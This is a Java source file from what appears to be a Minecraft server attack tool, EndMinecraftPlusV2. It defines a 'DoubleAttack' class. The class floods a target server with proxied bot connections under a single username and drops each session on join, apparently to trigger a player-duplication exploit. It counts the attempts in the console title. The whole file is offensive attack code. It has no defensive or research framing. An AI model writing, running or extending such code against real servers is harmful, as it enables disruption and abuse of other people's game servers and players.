package cn.serendipityr.EndMinecraftPlusV2.AttackUtils.Methods;

import cn.serendipityr.EndMinecraftPlusV2.Tools.SetTitle;
import org.spacehq.mc.protocol.packet.ingame.server.ServerJoinGamePacket;
import org.spacehq.packetlib.Client;
import org.spacehq.packetlib.Session;
import org.spacehq.packetlib.packet.Packet;

import java.net.Proxy;

public class DoubleAttack extends BotAttack {
    private String username;
    private Integer totalTimes = 0;
    private Integer runTimes = 0;

    public DoubleAttack(String ip, int port, int time, int maxconnect, long joinsleep) {
        super(ip, port, time, maxconnect, joinsleep);
    }

    public void setUsername(String username) {
        this.username = username;
    }

    public Client createClient(String ip, int port, String username, Proxy proxy) {
        totalTimes++;
        return super.createClient(ip, port, this.username, proxy);
    }

    protected void handlePacket(Session session, Packet recvPacket, String username) {
        super.handlePacket(session, recvPacket, username);
        if (recvPacket instanceof ServerJoinGamePacket) {
            session.disconnect("Double Exploit - Connection Reset!");
            runTimes++;
            SetTitle.INSTANCE.SetConsoleTitleA("EndMinecraftPlusV2 - DoubleAttack | 总连接数: " + totalTimes + "次 | 尝试分身: " + runTimes + "次");
        }
    }
}